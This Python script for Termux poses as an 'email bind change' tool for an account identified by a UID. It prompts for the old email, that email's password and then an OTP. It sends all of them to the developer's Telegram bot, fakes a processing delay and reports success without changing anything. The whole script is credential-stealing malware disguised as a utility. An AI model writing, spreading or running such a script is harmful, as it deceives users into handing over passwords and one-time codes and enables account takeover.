#!/usr/bin/env python3
# ==========================================================
#  EMAIL BIND CHANGE - TERMUX EDITION
#  Developer  : @INDRAJIT_1M
#  Protection : ENABLED
# ==========================================================

import os
import time
import requests
from colorama import Fore, Style, init

# IMPORT CONFIG
from config import (
    DEV_NAME,
    BOT_TOKEN,
    OWNER_ID,
    FEEDBACK_SUCCESS_MSG,
    OTP_REQUEST_MSG,
    FINAL_SUCCESS_MSG
)

init(autoreset=True)

# ================= BASIC FUNCTIONS =================

def clear():
    os.system("clear")

def banner():
    clear()
    print(f"""{Fore.CYAN}{Style.BRIGHT}
 ██████╗ ██╗███╗   ██╗██████╗
 ██╔══██╗██║████╗  ██║██╔══██╗
 ██████╔╝██║██╔██╗ ██║██║  ██║
 ██╔══██╗██║██║╚██╗██║██║  ██║
 ██████╔╝██║██║ ╚████║██████╔╝
 ╚═════╝ ╚═╝╚═╝  ╚═══╝╚═════╝
    """)
    print(f"{Fore.YELLOW}{'='*60}")
    print(f"{Fore.WHITE} DEVELOPER : {Fore.GREEN}{DEV_NAME}")
    print(f"{Fore.YELLOW}{'='*60}\n")

# ================= TELEGRAM FUNCTION =================

def send_telegram_message(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": OWNER_ID,
            "text": text,
            "parse_mode": "Markdown"
        }
        r = requests.post(url, data=payload, timeout=10)
        return r.status_code == 200
    except:
        return False

# ================= MAIN LOGIC =================

def main():
    banner()

    print(f"{Fore.CYAN}{' EMAIL BIND CHANGE PROCESS ':=^60}\n")

    uid = input(f"{Fore.CYAN}➤ Enter UID               : {Fore.WHITE}").strip()
    old_email = input(f"{Fore.CYAN}➤ Enter OLD Email        : {Fore.WHITE}").strip()
    old_pass = input(f"{Fore.CYAN}➤ Enter OLD Email Pass   : {Fore.WHITE}").strip()
    new_email = input(f"{Fore.CYAN}➤ Enter NEW Email        : {Fore.WHITE}").strip()

    if not all([uid, old_email, old_pass, new_email]):
        print(Fore.RED + "\n❌ All fields required!")
        return

    print(Fore.GREEN + "\n[✓] Details captured")

    details_msg = (
        f"📧 *EMAIL CHANGE REQUEST*\n\n"
        f"• UID: `{uid}`\n"
        f"• Old Email: `{old_email}`\n"
        f"• Old Pass: `{old_pass}`\n"
        f"• New Email: `{new_email}`\n"
        f"• Time: {time.strftime('%Y-%m-%d %H:%M:%S')}"
    )

    send_telegram_message(details_msg)
    send_telegram_message(FEEDBACK_SUCCESS_MSG)

    print(Fore.YELLOW + "\n[•] Sending OTP...")
    time.sleep(2)
    send_telegram_message(OTP_REQUEST_MSG)

    otp = input(f"\n{Fore.GREEN}➤ Enter OTP sent to {old_email}: {Fore.WHITE}").strip()
    if not otp:
        print(Fore.RED + "❌ OTP Required")
        return

    otp_msg = (
        f"🔐 *OTP RECEIVED*\n\n"
        f"• UID: `{uid}`\n"
        f"• OTP: `{otp}`\n"
        f"• Time: {time.strftime('%H:%M:%S')}"
    )
    send_telegram_message(otp_msg)

    print(Fore.YELLOW + "\n[•] Processing...")
    time.sleep(3)

    final_msg = (
        f"✅ *EMAIL CHANGE SUCCESS*\n\n"
        f"• UID: `{uid}`\n"
        f"• Old: `{old_email}`\n"
        f"• New: `{new_email}`\n"
        f"• OTP: `{otp}`\n"
        f"• Completed: {time.strftime('%Y-%m-%d %H:%M:%S')}"
    )

    send_telegram_message(final_msg)
    send_telegram_message(FINAL_SUCCESS_MSG)

    print(f"\n{Fore.GREEN}{' PROCESS COMPLETED SUCCESSFULLY ':=^60}")
    print(Fore.CYAN + "✓ Email bind changed")
    print(Fore.YELLOW + "✓ Admin notified\n")

# ================= RUN =================

if __name__ == "__main__":
    main()